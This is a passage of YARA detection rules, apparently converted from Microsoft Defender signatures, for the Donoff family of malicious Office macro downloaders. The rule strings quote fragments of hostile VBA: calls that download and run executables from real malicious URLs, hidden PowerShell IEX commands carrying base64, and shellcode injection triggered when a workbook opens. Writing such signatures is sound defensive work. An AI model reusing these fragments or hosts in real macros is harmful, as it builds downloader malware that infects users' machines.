        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 74 72 52 65 76 65 72 73 65 28 22 [0-5] 61 73 6a 6b 6c 61 64 38 37 33 32 31 61 73 6a 68 64 68 61 5c 70 6d 22 20 26 20 22 2e 22 20 26 20 22 6a 5c 5c 3a 73 22 20 26 20 22 70 74 74 68 22 [0-15] 20 61 22 20 26 20 22 74 22 20 26 20 22 68 22 20 26 20 22 73 22 20 26 20 22 6d 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 28 22 [0-20] 2e 65 78 65 20 22 22 43 3a 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 22 77 22 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e 0d 0a 46 75 6e 63 74 69 6f 6e 20 [0-10] 28 29 0d 0a 00 20 3d 20 22 69 22 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e 0d 0a 46 75 6e 63 74 69 6f 6e 20 [0-10] 28 29 0d 0a 02 20 3d 20 22 6e 22}  //weight: 2, accuracy: Low
        $x_2_2 = {28 22 20 33 20 32 20 5f 20 22 29 20 26 20 [0-20] 28 22 20 50 20 72 20 6f 20 63 20 65 20 73 20 73 20 22 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "and_caprice_and = \"notepad \"" ascii //weight: 1
        $x_1_2 = ").Run((and_caprice_and &" ascii //weight: 1
        $x_1_3 = "as_to_influence = \".txt\"" ascii //weight: 1
        $x_1_4 = "leave_her_uncle = \"wscript.shel\" &" ascii //weight: 1
        $x_1_5 = "Wscript.Quit = (\"\" & CreateObject(((leave_her_uncle))).Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "urlmon\"" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA\"" ascii //weight: 1
        $x_1_3 = {52 65 70 6c 61 63 65 28 22 7a 68 2e 73 65 74 61 64 70 75 2f 32 7a 68 2f 75 72 2e 41 42 56 6c 65 63 78 45 2f 2f 3a 70 74 74 68 22 2c [0-15] 43 68 72 28 31 31 32 29 20 26 20 43 68 72 28 31 30 34 29 20 26 20 43 68 72 28 31 31 32 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "URL$ = \"http://excelvba.ru/updates/download.php?addin=Parser" ascii //weight: 1
        $x_1_5 = "(\"tmp\") &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "23"
        strings_accuracy = "High"
    strings:
        $x_10_1 = ".CreateTextFile(\"C:\\ProgramData\\LKOJHFTDTYFVKDSFFV\", True)" ascii //weight: 10
        $x_10_2 = ".Exec \"explorer.exe \" & Re.Jo.Tag" ascii //weight: 10
        $x_1_3 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_4 = "FHDyhnsfxguhxfnhg.WriteLine (\"Verery\")" ascii //weight: 1
        $x_1_5 = "Set FHDyhnsfxguhxfnhg = Ret.CreateTextFile(Re.Jo.Tag, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-3] 69 6e 69 74 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 39 71 7a 75 22 2c 20 22 22 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "Set objWinDev = New WshShell" ascii //weight: 1
        $x_1_3 = "objWinDev.exec \"cmd /c \" + devDirDoc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set sFile = Fso.CreateTextFile(gPath & \"/TestFile.js\", True)" ascii //weight: 1
        $x_1_2 = "sFile.WriteLine (\"\" & vl)" ascii //weight: 1
        $x_1_3 = "= \"sj.udU8se25hgKL.gnp" ascii //weight: 1
        $x_1_4 = {72 75 6e 63 61 6c 63 20 3d 20 53 68 65 6c 6c 28 22 [0-32] 26 20 53 74 72 52 65 76 65 72 73 65 28 76 6c 32 29 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = "MsgBox (\"\" & sexec)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "xHttp.Open \"GET\", \"https://mailsending.site/Happy_CS/happyFun.exe\", False" ascii //weight: 1
        $x_1_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 2f 2f 57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f 4d 69 63 72 6f 73 6f 66 74 20 57 6f 72 6c 64 2e 65 78 65 22 2c 20 32 [0-3] 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = "Dim oShell: Set oShell = CreateObject(\"WSCript.shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sURL = \"http://p6920.cloudserver255.com/0az7vjb9jbefbkmu#########" ascii //weight: 1
        $x_1_2 = "RunProcess Clean(sURL), EncodeBase64(PAYLOAD)" ascii //weight: 1
        $x_1_3 = "InStr(1, data, \"#\") > 0 Then" ascii //weight: 1
        $x_1_4 = "EncodeBase64 = Replace(Mid(.text, 5), vbLf, \"\")" ascii //weight: 1
        $x_1_5 = "objHTTP.Open \"POST\", sURL, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "baby4 = \"1230948%1230948%1230948%1230948@j" ascii //weight: 1
        $x_1_2 = "heat = hate1 + hate2 + hate3 + String(1, \"h\") + String(2, \"t\") + baby22 + String(1, \":\") + tempo + baby4 & baby99999" ascii //weight: 1
        $x_1_3 = "Shell (heat)" ascii //weight: 1
        $x_1_4 = {62 61 62 79 39 39 39 39 39 20 3d 20 22 2e 6d 70 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 2f 22 29 20 2b 20 22 [0-15] 22 20 26 20 53 74 72 69 6e 67 28 35 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "m974e3e334b64ac13b6dec997fbabf21f = \"naiveremove" ascii //weight: 1
        $x_1_2 = "prqhhqrabc = \"fadzjgdilazu" ascii //weight: 1
        $x_1_3 = "WshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "qoxnwkqnhfshhimr = \"*\" & burgerorgan & \"*\"" ascii //weight: 1
        $x_1_5 = "WshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_6 = "WshShell.SpecialFolders(\"Recent\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (piglet & \" -W Hidden -c IEX(\" & owlet & \") \")" ascii //weight: 1
        $x_1_2 = "owlet = owlet + \"\\\"\" \" & whelp & \" \\\"\"));IEX $cv'" ascii //weight: 1
        $x_1_3 = "owlet = owlet + \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(" ascii //weight: 1
        $x_1_4 = "whelp = whelp + \"wB2AGUAcgAgAHMAYwByAG8AYgBqAC4AZABsAGwA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Dim Ojeqvo As Long, Jwlqo As Variant, Ohzb As Long" ascii //weight: 1
        $x_1_2 = {23 49 66 20 56 42 41 37 20 54 68 65 6e [0-6] 44 69 6d 20 59 67 6c 65 72 6a 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 50 6b 78 20 41 73 20 4c 6f 6e 67 50 74 72}  //weight: 1, accuracy: Low
        $x_1_3 = "For Ohzb = LBound(Jwlqo) To UBound(Jwlqo)" ascii //weight: 1
        $x_1_4 = "Ojeqvo = Jwlqo(Ohzb)" ascii //weight: 1
        $x_1_5 = "= RtlMoveMemory(Yglerj + Ohzb, Ojeqvo, 1)" ascii //weight: 1
        $x_1_6 = "= CreateThread(0, 0, Yglerj, 0, 0, 0)" ascii //weight: 1
        $x_1_7 = "Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "AyBtHTTCxaZFHeJ = AyBtHTTCxaZFHeJ + \"p\"" ascii //weight: 2
        $x_2_2 = "AyBtHTTCxaZFHeJ = AyBtHTTCxaZFHeJ + \"z\"" ascii //weight: 2
        $x_2_3 = "nYDEdWxMLSSwqHT = nYDEdWxMLSSwqHT + \"p\"" ascii //weight: 2
        $x_2_4 = "nYDEdWxMLSSwqHT = nYDEdWxMLSSwqHT + \"z\"" ascii //weight: 2
        $x_1_5 = {66 20 3d 20 78 73 61 64 77 71 64 77 71 64 28 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "Shell f" ascii //weight: 1
        $x_1_7 = "xsadwqdwqd = strInput" ascii //weight: 1
        $x_1_8 = "Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) - n)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 4 of ($x_1_*))) or
            ((3 of ($x_2_*) and 2 of ($x_1_*))) or
            ((4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "u = \"ur\" & Chr(108) & \"mon\"" ascii //weight: 1
        $x_1_2 = "l = \"UR\" & Chr(76) & \"Down\" & Chr(108) & \"oadToFi\" & Chr(108) & \"eA" ascii //weight: 1
        $x_1_3 = "keywords = \"= CALL(\"\"\" + u + \"\"\", \"\"\" + l + \"\"\", \"\"JJCCJJ\"\", 0, \"\"\" + title + \"\"\", \"\"\" + comments + \"\"\", 0, 0)" ascii //weight: 1
        $x_1_4 = "Set ExcelSheet = CreateObject(\"Excel.Application\")" ascii //weight: 1
        $x_1_5 = " = \"=EXEC(\"\"\" + comments + \"\"\")" ascii //weight: 1
        $x_1_6 = "= \"=WAIT(NOW() + \"\"00:00:8\"\")" ascii //weight: 1
        $x_1_7 = "strMacro = \"runthis" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set oApp = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_2 = "oApp.Namespace(eFname).CopyHere oApp.Namespace(zFname).items" ascii //weight: 1
        $x_1_3 = "fldr_addee_name = Environ$(\"USERPROFILE\") & \"\\MRtmedia\\\"" ascii //weight: 1
        $x_1_4 = "unaddeeip fldr_addee_name & file_addee_name & \".zip\", fldr_addee_name" ascii //weight: 1
        $x_1_5 = "Shell fldr_addee_name & file_addee_name & \".e\" & \"xe\", vbNormalNoFocus" ascii //weight: 1
        $x_1_6 = "ar1addee = Split(UserForm1.TextBox1.Text, \"a\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"W\" & \"sC\" & \"R\" + \"iPt\" & \".s\" + \"He\" & \"Ll" ascii //weight: 1
        $x_1_2 = " = \"cM\" & \"D /c M^si^E^xe^c \" &" ascii //weight: 1
        $x_1_3 = "Chr(32) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(116) & Chr(101) & Chr(104)" ascii //weight: 1
        $x_1_4 = "& Chr(114) & Chr(101) & Chr(110) & Chr(98) & Chr(101) & Chr(114) & Chr(103) & Chr(46) & Chr(99) & Chr(111) & Chr(109) &" ascii //weight: 1
        $x_1_5 = "Chr(47) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(112) & Chr(104) & Chr(112" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SS_2147754198_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SS!MTB"
        threat_id = "2147754198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ", \"X.XV\", \"http\")" ascii //weight: 1
        $x_1_2 = ", \"C.Ck\", \"e\")" ascii //weight: 1
        $x_1_3 = ", \"K.mP\", \"P\")" ascii //weight: 1
        $x_1_4 = "(\"B4E2D605F67734E234B627378634E234B6C6C60242" ascii //weight: 1
        $x_1_5 = "Do Until \"fuFqdgHhQbjTuqDCfNQJ\" <> \"VoAHbhbxOxUtfqhCvYFkTypcyRasjfBpM" ascii //weight: 1
        $x_1_6 = "Set RegX = CreateObject(\"VBScript.RegExp\")" ascii //weight: 1
        $x_1_7 = "ReplacedText = RegX.Replace(MyString, ReplaceString)" ascii //weight: 1
        $x_1_8 = "sTmpChar = Chr(\"&H\" & Mid(sData, iChar, Gravity))" ascii //weight: 1
        $x_1_9 = "Set G = RegX.Execute(Str)" ascii //weight: 1
        $x_1_10 = "Set objStartup = CreateObject(\"winmgmts:Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_11 = {53 65 74 20 6f 4f 75 74 50 61 72 61 6d 73 20 3d 20 6f 50 72 6f 63 65 73 73 2e 45 78 65 63 4d 65 74 68 6f 64 5f 28 [0-15] 28 22 34 33 37 32 36 35 36 31 37 34 36 35 22 29 2c 20 6f 49 6e 50 61 72 61 6d 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QL_2147754742_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QL!MTB"
        threat_id = "2147754742"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {72 74 65 28 39 32 29 [0-2] 26 [0-2] 72 74 65 28 38 38 29 [0-2] 26 [0-2] 72 74 65 28 37 32 29 [0-2] 26 [0-2] 72 74 65 28 31 31 39 29 [0-2] 26 [0-2] 72 74 65 28 31 31 30 29 [0-2] 26 [0-2] 72 74 65 28 31 31 37 29 [0-2] 26 [0-2] 72 74 65 28 31 32 31 29 [0-2] 26 [0-2] 72 74 65 28 35 31 29 [0-2] 26 [0-2] 72 74 65 28 31 32 30 29 [0-2] 26 [0-2] 72 74 65 28 31 30 39 29 [0-2] 26 [0-2] 72 74 65 28 31 30 36 29 [0-2] 26 [0-2] 72 74 65 28 31 31 33 29 [0-2] 26 [0-2] 72 74 65 28 31 31 33 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_V_2147755082_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.V!MTB"
        threat_id = "2147755082"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://playmesadelsol.com/wp-content/off/rt35.exe" ascii //weight: 1
        $x_1_2 = "ShellExecuteA" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "Covid-19" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147757058_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MSR"
        threat_id = "2147757058"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://tegavu.com/7280-2812-3332.dll" ascii //weight: 1
        $x_1_2 = "RLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147757058_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MSR"
        threat_id = "2147757058"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "inte = GetTempPathA(512, s)" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "u = Sheets(\"Sheet1\").Range(\"C4\")" ascii //weight: 1
        $x_1_4 = "b = Sheets(\"Sheet1\").Range(\"C10\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757062_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA"
        threat_id = "2147757062"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://fav1.ru/far.msi" ascii //weight: 1
        $x_1_2 = "http://fer1.ru/ff.msi" ascii //weight: 1
        $x_1_3 = "http://tov1.ru/toy.msi" ascii //weight: 1
        $x_1_4 = "http://ejv1.ru/123.msi" ascii //weight: 1
        $x_1_5 = "http://ffgh.ru/jj.msi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757062_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA"
        threat_id = "2147757062"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Str = Str + \"ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwB\"" ascii //weight: 1
        $x_1_2 = "CreateObject(\"Wscript.Shell\").Run Str" ascii //weight: 1
        $x_1_3 = {53 74 72 20 3d 20 53 74 72 20 2b 20 22 [0-63] 3d 22}  //weight: 1, accuracy: Low
        $x_5_4 = {53 74 72 20 3d 20 53 74 72 20 2b 20 22 [0-95] 22}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757175_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA!MTB"
        threat_id = "2147757175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"tps://www.diamantesviagens.com.br/rei2." ascii //weight: 1
        $x_1_2 = "= \"hta\"\" ht\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757175_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA!MTB"
        threat_id = "2147757175"
        type = "TrojanDownloader"
